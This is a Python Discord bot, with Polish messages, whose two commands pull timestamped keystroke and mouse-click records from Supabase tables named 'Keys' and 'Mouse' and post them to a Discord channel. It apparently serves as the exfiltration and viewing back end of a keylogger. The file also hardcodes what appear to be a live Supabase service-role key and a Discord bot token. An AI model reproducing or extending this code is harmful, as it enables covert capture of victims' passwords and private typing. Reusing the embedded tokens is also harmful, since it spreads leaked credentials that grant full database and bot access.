import discord
from discord.ext import commands
from supabase import *
import asyncio

url = "https://gurjbecyjphjhrhihnwv.supabase.co"
key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd1cmpiZWN5anBoamhyaGlobnd2Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc0NTA2NDI3NSwiZXhwIjoyMDYwNjQwMjc1fQ.ITRY-7aTl_M8eltm_MacrD_t3JeC2MBVBEzF8ae6J-g"
supabase: Client = create_client(url, key)

response = supabase.table("Keys").select("*").execute()

Token = "MTM1ODczMDgxMjc5MDU0MjUzOA.G-NKxn.ODsmvel5UQiDUwtG3LWmqnb7wNufomrz23qp9g"
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)



@bot.event
async def on_ready():
    print(f'Zalogowano jako {bot.user}')

@bot.command(name='Myszka')
async def fetch_users(ctx):
    response = supabase.table("Mouse").select("*").execute()
    keys = response.data

    if not keys:
        await ctx.send("Brak wpisow ;-;")
        return

    message = "**Odczytana mysz:**\n"
    messages_to_send = [] 

    for key in keys:
        create = key.get("created_at", "Brak daty")
        click = key.get("Data", "Brak przycisku")
        line = f"- {create}, {click}\n"

        if len(message) + len(line) > 2000:
            messages_to_send.append(message)
            message = ""

        message += line

    if message:
        messages_to_send.append(message)

    for msg in messages_to_send:
        await ctx.send(msg)
        
@bot.command(name='Klawiatura')
async def fetch_users(ctx):
    response = supabase.table("Keys").select("*").execute()
    keys = response.data

    if not keys:
        await ctx.send("Brak wpisow ;-;")
        return

    message = "**Odczytane klawisze:**\n"
    messages_to_send = []

    for key in keys:
        create = key.get("created_at", "Brak daty")
        click = key.get("buttons", "Brak przycisku")
        line = f"- {create}, {click}\n"

        if len(message) + len(line) > 2000:
            messages_to_send.append(message)
            message = ""

        message += line

    if message:
        messages_to_send.append(message)
    for msg in messages_to_send:
        await ctx.send(msg)

async def main():
    await bot.start(Token)
    
try:
    asyncio.get_running_loop()
    asyncio.create_task(main())
except RuntimeError:
    asyncio.run(main())

